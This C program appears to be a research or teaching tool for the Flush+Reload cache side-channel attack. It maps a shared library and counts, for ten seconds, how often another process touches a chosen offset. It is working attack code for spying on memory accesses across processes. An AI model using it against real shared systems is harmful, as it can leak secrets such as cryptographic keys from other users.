#define _GNU_SOURCE 1

#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

#include "cacheutils.h"


void* map_file(const char* filename, size_t* filesize) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        return NULL;
    }

    struct stat filestat;
    if (fstat(fd, &filestat) == -1) {
      close(fd);
      return NULL;
    }

    void* mapping = mmap(0, filestat.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (mapping == MAP_FAILED) {
        close(fd);
        return NULL;
    }

    if (filesize != NULL) {
      *filesize = filestat.st_size;
    }

    return mapping;
}


volatile int cnt = 0;


void sig_handler(int signum) {
  printf("%d\n", cnt);
  exit(0);
}
 
#include "libsc.h"

int main(int argc, char *argv[])
{
  if (argc != 3) {
    fprintf(stderr, "Usage: %s <library> <offset>\n", argv[0]);
    return -1;
  }

  /* Calculate Flush+Reload threshold */
  CACHE_MISS = 150;

  /* Map target file */
  size_t filesize = 0;
  char* mapping = map_file(argv[1], &filesize);

  fprintf(stderr, "Mapped %s to %p (%zu bytes)\n", argv[1], mapping, filesize);

  long unsigned int offset_p = strtoull(argv[2], NULL, 0);

  fprintf(stderr, "Monitoring offset %zu\n", offset_p);

  /* Profile */
  signal(SIGALRM, sig_handler); // Register signal handler
  
  alarm(10);
  //while(true) {
  //  if (flush_reload(mapping)) {
  //    alarm(1);
  //    break;
  //  }
  //}

  while (true) {
    /* Check if address has been accessed */
    if (flush_reload(mapping + offset_p)) {
      cnt++;
    }
    //printf("x\n");

  }

  return 0;
}
